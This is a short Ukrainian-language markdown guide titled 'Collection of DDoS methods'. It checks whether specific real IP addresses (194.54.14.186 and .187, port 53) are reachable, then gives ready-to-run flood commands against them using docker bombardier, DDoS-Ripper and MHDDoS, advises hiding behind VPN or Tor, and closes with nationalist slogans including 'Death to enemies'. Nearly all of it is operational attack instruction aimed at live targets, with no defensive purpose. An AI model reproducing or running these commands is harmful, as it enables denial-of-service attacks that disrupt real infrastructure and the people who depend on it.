# Збірка DDoS методів


## Провірка

**ping** метод (відкривати в Tor Browser або в будь-якому якщо є окрмеий VPN).

Ці сайти, це аналог звичайного ping-a тільки є дані про репліки (лоад балансінг хости)

```
https://port.ping.pe/194.54.14.186:53
```

Клікнути на ОК, і чекати поки інфо рефрешнеться про всі репліки. Ціль - ВСІ ЧЕРВОНІ

А тут вписати ТІЛЬКИ ХОСТ і клікнути UDP port (або Ping для провірки)

```
https://check-host.net/check-udp?host=194.54.14.187
```


## DDoS-имо з Docker-ом



**Docker** метод 1 (треба VPN)

```
docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l 194.54.14.186:53/UDP
```





## DDoS-имо з Python-ом



**DDoS-Ripper** PYTHON метод (треба VPN)

```
git clone https://github.com/palahsu/DDoS-Ripper.git
cd DDoS-Ripper
python3 DRipper.py -s 194.54.14.186 -p 53 -t 135 -q 10000 
```


**MHDDoS** PYTHON (тільки 3) метод (треба VPN)

```
git clone https://github.com/MHProDev/MHDDoS.git
cd MHDDoS
pip3 install -r requirements.txt 
python3 start.py udp 194.54.14.186:53 1000 3600
```

Норм якщо ви бачите "Attack Started !"
Але в мене на іншому компі депси не проінсталиись. рестартував. хз.


# Слава Україні!

# Героям Слава!

# Слава Нації!

# Смерть Ворогам!

# Україна понад усе
